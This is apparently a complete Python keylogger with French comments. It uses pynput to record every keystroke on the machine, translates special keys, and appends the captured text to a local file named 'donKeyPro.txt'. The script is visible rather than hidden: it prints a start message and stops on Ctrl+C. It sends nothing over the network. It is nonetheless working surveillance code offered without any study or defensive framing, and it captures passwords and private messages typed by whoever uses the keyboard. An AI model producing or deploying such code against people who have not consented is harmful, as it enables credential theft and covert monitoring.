# -*- coding: utf-8 -*-
from pynput.keyboard import Listener
from datetime import datetime
import re

# Dictionnaire pour mapper les touches spéciales
SPECIAL_KEYS = {
    'Key.space': ' ',
    'Key.shift': '',  # Ignore les touches shift
    'Key.shift_r': '',
    'Key.shift_l': '',
    'Key.ctrl_l': '',
    'Key.ctrl_r': '',
    'Key.alt_l': '',
    'Key.alt_r': '',
    'Key.alt_gr': '',  # Ignorer Alt Gr
    'Key.enter': '\n',
    'Key.backspace': '[BACKSPACE]',
    'Key.tab': '[TAB]',
    'Key.esc': '[ESC]',
    'Key.caps_lock': '',  # Ignorer Caps Lock
    'Key.delete': '[DELETE]',
    'Key.up': '[UP]',
    'Key.down': '[DOWN]',
    'Key.left': '[LEFT]',
    'Key.right': '[RIGHT]',
}

# Buffer pour accumuler les frappes
buffer = []

def write_to_file(key):
    """
    Traite la touche pressée et l'écrit dans le fichier.
    """
    try:
        # Convertit la touche en chaîne de caractères
        letter = str(key).replace("'", "")

        # Remplace les touches spéciales par leur représentation textuelle
        letter = SPECIAL_KEYS.get(letter, letter)

        # Gestion des backspaces
        if letter == '[BACKSPACE]':
            if buffer:  # Si le buffer n'est pas vide
                buffer.pop()  # Supprime le dernier caractère
        else:
            # Ajoute la lettre au buffer
            buffer.append(letter)

        # Écrit immédiatement dans le fichier (suppression de la limite)
        flush_buffer()

    except Exception as e:
        print(f"Erreur lors de l'écriture : {e}")

def flush_buffer():
    """
    Écrit le contenu du buffer dans le fichier et vide le buffer.
    """
    try:
        with open("donKeyPro.txt", 'a', encoding='utf-8') as f:
            # Ajoute un horodatage avant d'écrire les frappes
            #f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(''.join(buffer))
        buffer.clear()  # Vide le buffer après l'écriture
    except Exception as e:
        print(f"Erreur lors de l'écriture dans le fichier : {e}")

def clean_text(text):
    """
    Nettoie le texte en corrigeant les guillemets, les apostrophes et les erreurs d'encodage.
    """
    # Remplacer les doubles guillemets par des apostrophes simples
    text = re.sub(r'""', "'", text)
    # Remplacer les triples guillemets par des apostrophes simples
    text = re.sub(r'"""', "'", text)
    # Remplacer les caractères mal encodés
    text = text.encode('utf-8', errors='ignore').decode('utf-8')
    return text

# Démarre l'écoute du clavier
with Listener(on_press=write_to_file) as listener:
    try:
        print("Enregistrement des frappes... Appuyez sur Ctrl+C pour arrêter.")
        listener.join()
    except KeyboardInterrupt:
        # Écrit les frappes restantes dans le fichier avant de quitter
        flush_buffer()
        print("\nEnregistrement terminé. Les données ont été sauvegardées dans 'donKeyPro.txt'.")

        # Nettoyer le fichier après l'enregistrement
        try:
            with open("donKeyPro.txt", 'r', encoding='utf-8') as f:
                content = f.read()
            cleaned_content = clean_text(content)
            with open("donKeyPro.txt", 'w', encoding='utf-8') as f:
                f.write(cleaned_content)
            print("Le fichier a été nettoyé et les erreurs corrigées.")
        except Exception as e:
            print(f"Erreur lors du nettoyage du fichier : {e}")